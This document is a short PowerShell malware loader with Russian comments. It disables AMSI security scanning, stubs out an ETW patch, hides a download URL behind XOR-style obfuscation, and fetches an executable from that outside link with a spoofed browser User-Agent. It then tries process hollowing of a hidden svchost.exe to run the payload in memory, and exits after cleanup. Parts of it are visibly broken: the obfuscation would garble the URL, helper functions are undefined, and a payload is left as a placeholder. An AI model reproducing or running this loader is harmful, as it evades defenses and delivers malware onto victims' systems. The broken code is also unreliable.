# AMSI + ETW + ConHost Bypass
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.FullName-like"*Context*"){foreach($c in $b.GetFields('NonPublic,Static')){if($c.Name-like"*Context"){$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($c.GetValue($b.GetValue(0)),[IntPtr]);$d.Invoke([IntPtr]0,[uint32]0,[IntPtr]0)}}}}
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW Patch
$code=[Convert]::FromBase64String('...ETW_BYPASS_X64_BASE64...');$ntdll=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll GetProcAddress),[IntPtr]); # упрощенный

# URL в байтах (XOR obfuscation)
$u=104,116,116,112,115,58,47,47,117,46,116,111,47,90,72,90,51,73,103; $xor=0x5A; $url=[string]::Concat(($u|%{[char]($_-bxor $xor)}))

# Download EXE bytes
$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'); $bytes=$wc.DownloadData($url); $wc.Dispose()

# Reflective PE Loader (Memory-only execution)
$pe=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length); [System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$pe,$bytes.Length)

# PE Headers parsing + Relocations (упрощенный)
$dos=[System.BitConverter]::ToUInt16($bytes,60); $nt=[IntPtr]($pe.ToInt64()+$dos); $imagebase=[System.BitConverter]::ToUInt64($bytes,$nt.ToInt32()+24)

# Create suspended process (svchost.exe)
$si=New-Object System.Diagnostics.ProcessStartInfo; $si.FileName='svchost.exe'; $si.Arguments='-k netsvcs'; $si.UseShellExecute=$false; $si.CreateNoWindow=$true; $p=[Diagnostics.Process]::Start($si); $p.WaitForInputIdle()

# Process Hollowing
$ctx=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x1000); $ntdll=Get-ProcAddress kernel32.dll NtUnmapViewOfSection; $ntdll.Invoke([IntPtr]$p.Handle,$imagebase) | Out-Null
WriteProcessMemory $p.Handle $imagebase $pe ($bytes.Length) | Out-Null

# Resume execution
$ntdll=Get-ProcAddress ntdll.dll NtResumeThread; $ntdll.Invoke([IntPtr]$p.Threads[0].Handle,$ctx) | Out-Null

# Cleanup
[System.GC]::Collect(); Start-Sleep -m 100; $p.Dispose(); [Environment]::Exit(0)
